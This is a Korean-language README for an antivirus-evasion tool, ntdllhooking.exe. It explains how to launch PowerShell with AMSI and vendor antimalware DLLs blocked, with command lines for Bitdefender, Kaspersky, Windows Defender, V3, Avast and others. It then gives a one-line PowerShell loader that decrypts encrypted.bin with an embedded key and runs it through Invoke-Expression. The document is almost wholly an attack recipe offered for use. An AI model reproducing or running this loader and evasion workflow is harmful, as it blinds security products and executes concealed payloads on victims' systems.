### 사용 방법
encrypted.bin, ntdllhooking.exe가 있어야 합니다.
1. powershell 띄우기
```
ntdllhooking.exe powershell.exe <막을 dll>
```
(아무 dll을 입력하지 않을 경우 기본으로 amsi.dll을 막습니다.) 

- bitdefender
    ```
    ntdllhooking.exe powershell.exe amsi.dll,bdhkm64.dll,atcuf64.dll,antimalware_provider64.dll,AtcIntegration.dll
    ```

- V3
    ```
    ntdllhooking.exe powershell.exe
    ```
- nprotect
    ```
    ntdllhooking.exe powershell.exe
    ```
- Alyac
    ```
    ntdllhooking.exe powershell.exe
    ```
- kaspersky
    ```
    ntdllhooking.exe powershell.exe amsi.dll,antimalware_provider.dll
    ```
- Avast
    ```
    ntdllhooking.exe powershell.exe
    ```
- windows defender
    ```
    ntdllhooking.exe powershell.exe
    ```

2. powershell 명령어
```
$key=[Convert]::FromBase64String("W/IPKrjcpjPbVGAbhXewZn6UTBXnIF8SXhIN+PrnEivIL9Y9LUBme3KYOlJu/PfNb5fCDYtzpNba6UGkndxBrA==");$data=[IO.File]::ReadAllBytes("encrypted.bin");if($null -eq $data -or $data.Length -lt 64){throw "Invalid encrypted file"};$iv=New-Object byte[] 16;[Array]::Copy($data,0,$iv,0,16);$cipherLength=$data.Length-48;if($cipherLength -le 0 -or ($cipherLength%16)-ne 0){throw "Invalid ciphertext length"};$ciphertext=New-Object byte[] $cipherLength;[Array]::Copy($data,16,$ciphertext,0,$cipherLength);$mac=New-Object byte[] 32;[Array]::Copy($data,16+$cipherLength,$mac,0,32);if($key.Length -ne 64){throw "Key must be 64 bytes"};$aesKey=New-Object byte[] 32;$hmacKey=New-Object byte[] 32;[Array]::Copy($key,0,$aesKey,0,32);[Array]::Copy($key,32,$hmacKey,0,32);$hmacInput=New-Object byte[] (16+$cipherLength);[Array]::Copy($iv,0,$hmacInput,0,16);[Array]::Copy($ciphertext,0,$hmacInput,16,$cipherLength);$h=New-Object Security.Cryptography.HMACSHA256(,$hmacKey);try{$expectedMac=$h.ComputeHash($hmacInput);if(-not [Collections.StructuralComparisons]::StructuralEqualityComparer.Equals($mac,$expectedMac)){throw "HMAC verification failed"};$aes=[Security.Cryptography.Aes]::Create();try{$aes.Key=$aesKey;$aes.IV=$iv;$aes.Mode=[Security.Cryptography.CipherMode]::CBC;$aes.Padding=[Security.Cryptography.PaddingMode]::PKCS7;$dec=$aes.CreateDecryptor();try{$scriptBytes=$dec.TransformFinalBlock($ciphertext,0,$ciphertext.Length)}finally{$dec.Dispose()}}finally{$aes.Dispose()};$script=[Text.Encoding]::UTF8.GetString($scriptBytes);}finally{$h.Dispose()}; Invoke-Expression $script; Invoke-COOK -command "coffee"
```
